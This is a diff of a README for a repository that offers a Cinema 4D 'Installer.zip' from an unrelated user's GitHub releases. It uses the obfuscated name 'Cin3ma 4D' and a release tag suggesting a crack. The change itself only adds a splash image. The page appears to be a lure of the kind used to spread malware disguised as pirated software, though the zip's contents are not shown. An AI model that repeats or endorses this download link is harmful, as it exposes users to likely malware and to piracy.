@@ -3,6 +3,8 @@
 # Download [Download Installer](https://github.com/eduardoleeaal/Cinema4d2024/releases/download/cinema4dcr/Installer.zip)
 
 ## Overview
+![Cinema-4D-2025-Splash-Flower-by-Mario-Tran-Phuc](https://github.com/user-attachments/assets/de3e82a5-2ada-44da-a8c8-0acfd7f8ce33)
+
 
 Welcome to the repository of **Cin3ma 4D**! Cin3ma 4D is a powerful 3D software suite developed by Maxon, designed for 3D modeling, animation, simulation, and rendering. It offers a comprehensive set of tools that make it suitable for a wide range of creative applications, including motion graphics, visual effects, and architectural visualization. With its user-friendly interface and robust features, Cinema 4D empowers artists and designers to bring their creative visions to life.
 
